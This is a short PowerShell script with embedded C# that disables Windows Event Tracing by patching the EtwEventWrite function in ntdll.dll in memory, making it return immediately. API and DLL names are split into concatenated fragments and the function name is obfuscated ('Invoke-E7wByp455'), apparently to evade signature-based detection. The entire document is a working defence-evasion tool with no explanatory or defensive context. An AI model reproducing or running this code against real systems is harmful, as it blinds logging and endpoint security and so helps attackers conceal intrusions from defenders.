$Win32Etw = @"

using System;
using System.Runtime.InteropServices;

public class Win32Etw {


    public static void WriteToMemory(byte[] patch, IntPtr address) {
        unsafe {
            fixed (byte* p = patch) {
                byte* ptr = (byte*)address.ToPointer();
                for (int i = 0; i < patch.Length; i++) {
                    ptr[i] = p[i];
                }
            }
        }
	}
    

    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);

    [DllImport("kernel32",EntryPoint="Load"+"Library")]
    public static extern IntPtr ll(string name);

    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@ 



function Invoke-E7wByp455{
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
		$compilerParameters.CompilerOptions = "/unsafe"
		Add-Type $Win32Etw -CompilerParameters $compilerParameters
    }

    Process {
		$LoadLibrary = [Win32Etw]::ll("ntd" + "ll.dll")
		$Address = [Win32Etw]::gpa($LoadLibrary, "Etw" + "Event" + "Write")
		$p = 0
		[Win32Etw]::vp($Address, [uint32]3, 0x40, [ref]$p)
		$Patch = [Byte[]] (0xB0,0x00,0xC3)
		[Win32Etw]::WriteToMemory($patch, $address)
    }
}
